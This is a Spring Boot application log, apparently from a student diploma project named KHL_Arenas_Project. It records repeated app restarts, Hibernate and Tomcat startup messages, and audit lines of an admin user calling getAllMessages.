+06-05-2024 11:40:19 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 11:40:19 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 11:40:19 INFO  Started KhlArenasProjectApp in 4.032 seconds (process running for 4.32)
+06-05-2024 11:40:25 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 11:40:25 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 11:40:25 INFO  Completed initialization in 1 ms
+06-05-2024 11:40:33 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 11:50:15 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:50:15 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 11:50:15 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 11:50:17 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 38882 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 11:50:17 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 11:50:18 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 11:50:18 INFO  Finished Spring Data repository scanning in 51 ms. Found 5 JPA repository interfaces.
+06-05-2024 11:50:18 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 11:50:18 INFO  Starting service [Tomcat]
+06-05-2024 11:50:18 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 11:50:18 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 11:50:18 INFO  Root WebApplicationContext: initialization completed in 1204 ms
+06-05-2024 11:50:18 INFO  HikariPool-1 - Starting...
+06-05-2024 11:50:19 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 11:50:19 INFO  HikariPool-1 - Start completed.
+06-05-2024 11:50:19 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 11:50:19 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 11:50:19 INFO  HHH000026: Second-level cache disabled
+06-05-2024 11:50:19 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 11:50:19 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 11:50:20 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 11:50:20 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:50:20 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 11:50:20 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 11:50:20 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 11:50:21 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 11:50:21 INFO  Started KhlArenasProjectApp in 3.838 seconds (process running for 4.143)
+06-05-2024 11:50:24 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 11:50:24 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 11:50:24 INFO  Completed initialization in 1 ms
+06-05-2024 11:50:28 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 11:50:32 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:11:46 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:11:46 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:11:46 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:11:49 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 40404 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:11:49 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:11:49 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:11:49 INFO  Finished Spring Data repository scanning in 47 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:11:50 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:11:50 INFO  Starting service [Tomcat]
+06-05-2024 12:11:50 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:11:50 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:11:50 INFO  Root WebApplicationContext: initialization completed in 1269 ms
+06-05-2024 12:11:50 INFO  HikariPool-1 - Starting...
+06-05-2024 12:11:50 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@2744dcae
+06-05-2024 12:11:50 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:11:51 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:11:51 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:11:51 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:11:51 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:11:51 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:11:51 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:11:52 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:11:52 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:11:52 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:11:52 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@593e594f, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@3a1e5fa7, org.springframework.security.web.context.SecurityContextHolderFilter@26f7b114, org.springframework.security.web.header.HeaderWriterFilter@29a5f924, org.springframework.web.filter.CorsFilter@7866fe3e, org.springframework.security.web.authentication.logout.LogoutFilter@3eadfbbb, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@4bdbfbc6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@22f0e329, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3b39bee2, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@498f1f63, org.springframework.security.web.access.ExceptionTranslationFilter@2ddb6c71, org.springframework.security.web.access.intercept.AuthorizationFilter@73072745]
+06-05-2024 12:11:52 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:11:52 INFO  Started KhlArenasProjectApp in 4.066 seconds (process running for 4.394)
+06-05-2024 12:12:04 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:12:04 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:12:04 INFO  Completed initialization in 2 ms
+06-05-2024 12:12:07 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:21:27 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:21:27 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:21:27 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:21:29 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 40904 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:21:29 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:21:30 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:21:30 INFO  Finished Spring Data repository scanning in 53 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:21:31 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:21:31 INFO  Starting service [Tomcat]
+06-05-2024 12:21:31 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:21:31 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:21:31 INFO  Root WebApplicationContext: initialization completed in 1297 ms
+06-05-2024 12:21:31 INFO  HikariPool-1 - Starting...
+06-05-2024 12:21:31 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 12:21:31 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:21:31 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:21:31 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:21:31 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:21:31 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:21:31 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:21:32 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:21:32 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:21:32 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:21:32 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:21:33 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 12:21:33 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:21:33 INFO  Started KhlArenasProjectApp in 4.099 seconds (process running for 4.413)
+06-05-2024 12:21:35 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:21:35 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:21:35 INFO  Completed initialization in 1 ms
+06-05-2024 12:21:48 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:22:16 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:22:58 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:22:58 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:22:58 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:23:01 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 41245 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:23:01 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:23:02 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:23:02 INFO  Finished Spring Data repository scanning in 66 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:23:03 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:23:03 INFO  Starting service [Tomcat]
+06-05-2024 12:23:03 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:23:03 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:23:03 INFO  Root WebApplicationContext: initialization completed in 1842 ms
+06-05-2024 12:23:03 INFO  HikariPool-1 - Starting...
+06-05-2024 12:23:04 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@7cf63b9a
+06-05-2024 12:23:04 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:23:04 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:23:04 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:23:04 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:23:04 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:23:04 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:23:05 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:23:05 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:23:05 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:23:05 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:23:06 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@6bc08a77, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@37922937, org.springframework.security.web.context.SecurityContextHolderFilter@26caf4b6, org.springframework.security.web.header.HeaderWriterFilter@5776a9f8, org.springframework.web.filter.CorsFilter@73483d4b, org.springframework.security.web.authentication.logout.LogoutFilter@3f67f5ff, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@951461a, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@2c750b69, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@159a0f0e, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@8961e55, org.springframework.security.web.access.ExceptionTranslationFilter@5eadc347, org.springframework.security.web.access.intercept.AuthorizationFilter@58701e8c]
+06-05-2024 12:23:06 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:23:06 INFO  Started KhlArenasProjectApp in 5.607 seconds (process running for 5.955)
+06-05-2024 12:23:07 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:23:07 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:23:07 INFO  Completed initialization in 2 ms
+06-05-2024 12:23:10 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:26:15 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:26:15 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:26:15 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:26:17 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 41736 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:26:17 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:26:18 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:26:18 INFO  Finished Spring Data repository scanning in 60 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:26:19 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:26:19 INFO  Starting service [Tomcat]
+06-05-2024 12:26:19 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:26:19 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:26:19 INFO  Root WebApplicationContext: initialization completed in 1330 ms
+06-05-2024 12:26:19 INFO  HikariPool-1 - Starting...
+06-05-2024 12:26:19 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@7cf63b9a
+06-05-2024 12:26:19 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:26:19 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:26:19 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:26:19 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:26:19 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:26:19 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:26:20 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:26:20 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:26:20 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:26:20 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:26:21 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@6bc08a77, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@37922937, org.springframework.security.web.context.SecurityContextHolderFilter@26caf4b6, org.springframework.security.web.header.HeaderWriterFilter@5776a9f8, org.springframework.web.filter.CorsFilter@73483d4b, org.springframework.security.web.authentication.logout.LogoutFilter@3f67f5ff, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@951461a, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@2c750b69, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@159a0f0e, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@8961e55, org.springframework.security.web.access.ExceptionTranslationFilter@5eadc347, org.springframework.security.web.access.intercept.AuthorizationFilter@58701e8c]
+06-05-2024 12:26:21 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:26:21 INFO  Started KhlArenasProjectApp in 4.01 seconds (process running for 4.297)
+06-05-2024 12:26:25 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:26:25 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:26:25 INFO  Completed initialization in 1 ms
+06-05-2024 12:26:28 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:42:45 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:42:45 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:42:45 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:42:58 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 42801 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:42:58 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:42:59 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:42:59 INFO  Finished Spring Data repository scanning in 56 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:43:00 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:43:00 INFO  Starting service [Tomcat]
+06-05-2024 12:43:00 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:43:00 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:43:00 INFO  Root WebApplicationContext: initialization completed in 1241 ms
+06-05-2024 12:43:00 INFO  HikariPool-1 - Starting...
+06-05-2024 12:43:00 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@265a094b
+06-05-2024 12:43:00 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:43:00 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:43:00 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:43:00 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:43:00 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:43:00 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:43:01 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:43:01 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:43:01 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:43:01 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:43:02 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@2f0e7008, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@307e9c02, org.springframework.security.web.context.SecurityContextHolderFilter@5776a9f8, org.springframework.security.web.header.HeaderWriterFilter@5eadc347, org.springframework.web.filter.CorsFilter@682270ff, org.springframework.security.web.authentication.logout.LogoutFilter@5b4ce00, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@550e7ef6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@446fb72e, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@26caf4b6, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6bc08a77, org.springframework.security.web.access.ExceptionTranslationFilter@70f0c352, org.springframework.security.web.access.intercept.AuthorizationFilter@3eadfbbb]
+06-05-2024 12:43:02 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:43:02 INFO  Started KhlArenasProjectApp in 3.899 seconds (process running for 4.212)
+06-05-2024 12:43:05 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:43:05 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:43:05 INFO  Completed initialization in 2 ms
+06-05-2024 12:43:12 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:43:31 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:43:31 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:43:31 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:43:33 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 42934 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:43:33 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:43:34 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:43:34 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:43:35 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:43:35 INFO  Starting service [Tomcat]
+06-05-2024 12:43:35 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:43:35 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:43:35 INFO  Root WebApplicationContext: initialization completed in 1273 ms
+06-05-2024 12:43:35 INFO  HikariPool-1 - Starting...
+06-05-2024 12:43:35 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 12:43:35 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:43:35 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:43:35 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:43:35 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:43:35 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:43:36 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:43:36 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:43:36 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:43:36 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:43:36 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:43:37 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 12:43:37 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:43:37 INFO  Started KhlArenasProjectApp in 3.927 seconds (process running for 4.197)
+06-05-2024 12:43:41 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:43:41 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:43:41 INFO  Completed initialization in 1 ms
+06-05-2024 12:43:44 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:50:52 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:50:52 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:50:52 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:50:54 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 43424 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:50:54 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:50:54 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:50:55 INFO  Finished Spring Data repository scanning in 51 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:50:55 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:50:55 INFO  Starting service [Tomcat]
+06-05-2024 12:50:55 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:50:55 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:50:55 INFO  Root WebApplicationContext: initialization completed in 1259 ms
+06-05-2024 12:50:55 INFO  HikariPool-1 - Starting...
+06-05-2024 12:50:56 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6ee88e21
+06-05-2024 12:50:56 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:50:56 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:50:56 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:50:56 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:50:56 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:50:56 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:50:57 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:50:57 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:50:57 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:50:57 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
